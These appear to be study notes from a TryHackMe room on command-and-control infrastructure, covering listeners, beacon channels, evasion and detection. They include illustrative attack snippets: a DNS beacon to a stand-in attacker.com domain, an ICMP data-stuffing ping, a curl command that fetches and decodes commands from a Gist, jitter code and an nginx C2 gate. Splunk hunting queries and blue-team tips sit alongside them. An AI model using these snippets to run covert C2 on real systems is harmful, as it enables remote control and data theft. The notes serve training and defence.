Original Notes

Command‑and‑Control (C2)

https://tryhackme.com/room/introtoc2

1- Overview

A C2 server is attacker‑controlled infrastructure—often a public IP or domain name—hosting listeners that compromised machines (“agents” or “beacons”) call back to. It functions like a multi‑user Netcat listener, but with advanced payload management, tasking, and data collection. Common C2 frameworks include Cobalt Strike, Metasploit, Empire, Sliver, and Brute Ratel.

Core purposes:

  • Instruction delivery (run new payloads, lateral movement tools)
  • Data exfiltration (credentials, documents, keylogs)
  • Configuration updates (modify beacon intervals, encryption keys)

MITRE ATT&CK: T1071 Application Layer Protocol, T1090 Proxy, T1102 Web Service

2- Core Components

2-1 C2 Server

  • Hosts one or more listeners on specific ports/protocols.
  • Manages sessions: each agent maintains a unique session ID.
  • Provides UI/API for operator to issue commands, view output, and push modules.

2-2 Agent / Payload

  • Generated by the framework (e.g., MSFVenom stagers, Cobalt Strike beacons).
  • Implements “pseudo‑commands” (upload/download, screenshot, port scan).
  • Highly configurable: sleep timer, jitter, transport protocol, encryption.

2-3 Listener

  • Network service on C2 server (HTTP/S, DNS, raw TCP, SMB, ICMP).
  • Parses incoming callbacks, dispatches operator tasks, returns results.
  • Listener Types
    • Standard Listener
      • Protocol: Raw TCP or UDP socket
      • Behavior: Commands and responses in cleartext
      • Example Frameworks: Metasploit’s multi/handler with Payload: windows/shell/reverse_tcp
      • Blue‑Team Tip: Watch for unusual long‑lived TCP sessions on non‑standard ports (Sysmon Event 3).
    • HTTP/HTTPS Listener
      • Protocol: HTTP (80) or HTTPS (443)
      • Behavior: Fronts as a web server; often uses Domain Fronting or Malleable C2 profiles
      • Example Frameworks: Cobalt Strike HTTP‑based beacons, Empire’s http_listener
      • Blue‑Team Tip: Inspect URI patterns and User‑Agent strings; enable SSL‑proxy/inspection to catch hidden POSTs.
    • DNS Listener
      • Protocol: DNS queries (A, TXT, NULL) over UDP/TCP 53
      • Behavior: Encodes beacons in subdomains; returns commands in TXT records
      • Example: Metasploit’s meterpreter/reverse_dns (with auxiliary DNS server), dnscat2
      • Blue‑Team Tip: Monitor high‑entropy TXT queries and spikes in DNS traffic to single domains.
    • SMB Listener
      • Protocol: SMB named pipes over TCP 445
      • Behavior: Establishes an SMB session, then uses named‑pipe RPC for C2
      • Example: Metasploit’s windows/smb/reverse_named_pipe payload
      • Blue‑Team Tip: Look for unusual SMB connections from workstations to non‑DC hosts, and use Sysmon Event 3 with PipeName filters.

2-4 Beacon

  • Periodic outbound callback from agent to listener.
  • Contains session heartbeat plus any exfil/data chunk requests.
  • Can be full HTTP POST, DNS TXT query, ICMP payload, etc.

3- Common C2 Communication Channels

3-1 HTTP / HTTPS

  • Transport: GET/POST over TCP 80/443, often with TLS.
  • Technique: Agent crafts requests with custom URI paths, headers, and encodes data in cookies or POST bodies.
  • Example:

```jsx POST /api/v1/update HTTP/1.1 Host: assets.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Cookie: sessionid=ABCD1234; beacon=eyJpZCI6IjEiLCJkYXRhIjoiSGVsbG8ifQ==

{"id":"1","output":"...base64..."} ```

  • Detection:
    • Rare or random subdomains (e.g., a1b2c3.attacker.net)
    • Unusual User-Agent strings or mismatched Host headers
    • High‑volume POSTs with similar size/responses
  • Splunk:

``jsx index=network_http | stats count, avg(bytes_in), avg(bytes_out) by src_ip, host, uri_path | where count>100 AND host NOT IN (whitelisted_hosts) ``

  • MITRE: T1071.001 (Web Protocols)

3-2 DNS Tunneling

  • Transport: DNS queries (A, TXT, NULL) over UDP/TCP 53.
  • Technique: Data is Base32/Base64‑encoded into subdomain labels; commands returned in TXT records.
  • Example Flow:
    1. Agent sends dGhpcy1pcy1iYXNlNjQ.attacker.com
    2. C2’s DNS server decodes “this‑is‑base64” → understands it as a beacon.
    3. Responds with TXT: "Y21kOiBydW4gc2hlbGwi" → Base64 for cmd: run shell.
  • Detection:
    • Excessive TXT or NULL queries to one domain
    • Very long, high‑entropy subdomain labels
  • Splunk:

``jsx index=dns | where query_type="TXT" | eval length=len(query) | stats count by src_ip, query, length | where count>50 OR length>50 ``

  • Tools: dnscat2, iodine, DNSCat
  • MITRE: T1071.004 (DNS)

3-3 ICMP (Ping)

  • Transport: ICMP Echo Request/Reply.
  • Technique: Encrypted data stuffed into ICMP payload.
  • Example:

``jsx ping -p 48656c6c6f202d2049434d50 10.0.0.1 ``

(payload hex for “Hello – ICMP”)

  • Detection:
    • Regular‑interval pings with non‑standard payload sizes
    • High‑frequency ICMP to unusual external IPs
  • Splunk:

``jsx index=network_icmp | stats count, avg(bytes) by src_ip, dest_ip | where count>20 AND avg(bytes)>100 ``

  • MITRE: T1090.003 (ICMP)

3-4 Peer‑to‑Peer (P2P)

  • Transport: Custom TCP/UDP protocols across many peers.
  • Technique: Each node gossips commands and data via a DHT (e.g., Kademlia).
  • Example: Storm Worm’s P2P overlay—no central server.
  • Detection:
    • Many short‑lived connections on high ports (>1024)
    • Unusual protocols/handshakes (non‑HTTP/TLS)
  • MITRE: T1095 (P2P)

3-5 Cloud Services & Social Media

  • Transport: HTTPS to AWS S3, Google Drive, GitHub API, Twitter API, Slack Webhooks.
  • Technique: Agent polls a public bucket/file or social‑media post for encrypted JSON/YAML.
  • Examples:
    • GitHub Gist:

``bash curl -s https://api.github.com/gists/abcd1234 | jq -r '.files["cmd"].content' | base64 -d ``

    • Slack C2:

``python import requests resp = requests.get("https://hooks.slack.com/services/T000/B000/XXXX", headers={"Authorization":"Bearer xoxb-..."}) ``

  • Detection:
    • Unexpected cloud API usage from non‑cloud servers
    • Access to personal social‑media endpoints
  • Splunk:

`` index=cloud_api | where action="GetObject" AND bucket NOT IN (approved_buckets) ``

  • MITRE: T1102 (Web Service)

4- Obfuscation & Evasion

Attackers layer obfuscation and evasion techniques on top of their basic C2 channels to blend into legitimate traffic and defeat detection tools. These measures range from simple timing tweaks to advanced proxying and protocol abuse. Below is an overview of why they matter, followed by the key methods:

Why it matters:
- Avoid signature‑based detection: randomized patterns defeat static IOCs.
- Bypass behavioral analytics: mimic normal user/network activity.
- Delay discovery and response: longer dwell time means deeper compromise.

4-1 Sleep Timers & Jitter

Fixed‑interval beaconing is a giveaway—security tools flag perfectly periodic callbacks. By adding jitter (random variation) to the sleep timer, C2 traffic looks less robotic:

python
import time, random

base = 60            # base interval in seconds
jitter_pct = 0.3     # ±30%
jitter = base * jitter_pct * (random.random()*2 - 1)
sleep_interval = base + jitter
time.sleep(sleep_interval)
  • Advanced options: exponential backoff, time‑of‑day scheduling, adaptive to network load.

4-2 Fast‑Flux DNS

Instead of a single static IP, the C2 domain’s DNS A records rotate through a large pool of compromised hosts:

  • Benefit: takedowns become impractical, and IP‑based blocklists fail.
  • Detection: monitor for domains with rapidly changing DNS records and many unique A‑record IPs.

4-3 Domain Fronting

Attackers hijack a high‑reputation CDN (e.g., Cloudflare, Google) by spoofing the HTTP Host header while using the CDN’s SNI:

  1. Client opens TLS to cdn.example.net (trusted).
  2. Host header inside the encrypted HTTP request is evil.com.
  3. CDN forwards to evil.com origin—external observers only see cdn.example.net.
  4. Benefit: C2 traffic looks like normal CDN usage.
  5. Detection: correlate SNI vs Host header mismatches in SSL‑proxy logs.

4-4 C2 Profiles & Reverse Proxies

Frameworks like Cobalt Strike let you define Malleable C2 Profiles to customize:

  • URIs, headers, cookie names
  • Encryption wrappers (JSON, chunked responses)
  • Response behaviors (serve a normal webpage to analysts, C2 payload to beacons)

Alternatively, use NGINX/Apache as a reverse proxy to inspect a secret header or URI token:

jsx
# example snippet
if ($http_x_c2_secret != "s3cr3t") {
    return 403;
}
proxy_pass http://backend_c2;

5- Payload Types & Formats

5-1 Stageless

  • Single binary contains full agent.
  • Pros: Immediate functionality.
  • Cons: Larger on‑disk footprint.

5-2 Staged

  • Small stager fetches full agent from C2.
  • Pros: Smaller initial payload, easier AV evasion.
  • Cons: Requires second‑stage download.

Staged Flow Diagram

powershell
[Victim] → runs stager → [C2 Server] → delivers stage2 → [Victim loads full agent]

5-3 Payload Formats

  • PE Executables (.exe, .dll)
  • PowerShell (.ps1 or Invoke-Expression inline)
  • HTA, JScript, VBA Macros (Office docs)
  • .NET Assemblies, Python (via PyInstaller)

6- Modules & Post‑Exploitation

  • Metasploit Modules (Ruby)
  • Cobalt Strike Aggressor Scripts
  • Empire Modules (PowerShell, Python)

Common Post‑Exploitation:

  • LSASS dump (ProcMem, procdump) → credential harvesting
  • Network reconnaissance (SharpHound, BloodHound)
  • Keylogging, screenshot capture

Pivoting:

  • SMB Beacon: SMB named‑pipe proxy via a compromised host

  • SOCKS Proxy: ssh -D style tunneling

7- Detection & Hunting

7-1 Network‑Based

  • Beacon analysis: look for regular intervals (HTTP, DNS, ICMP).
  • High‑entropy domains: regex match random subdomains.
  • Zeek: detect unusual DNS TXT, ICMP payloads.

7-2 Endpoint‑Based

  • Sysmon:
    • Event 3 (Network Connect)
    • Event 10 (Process Access)
    • Event 22 (DNS Query)
  • EDR: detect in‑memory PE injection, reflective DLL load, PowerShell obfuscation.

7-3 Splunk Queries

See channel‑specific queries above. Additionally, generic beacon hunt:

jsx
index=network*
| bin _time span=1m
| stats count by src_ip, _time
| streamstats window=5 stdev(count) as sd mean(count) as mu by src_ip
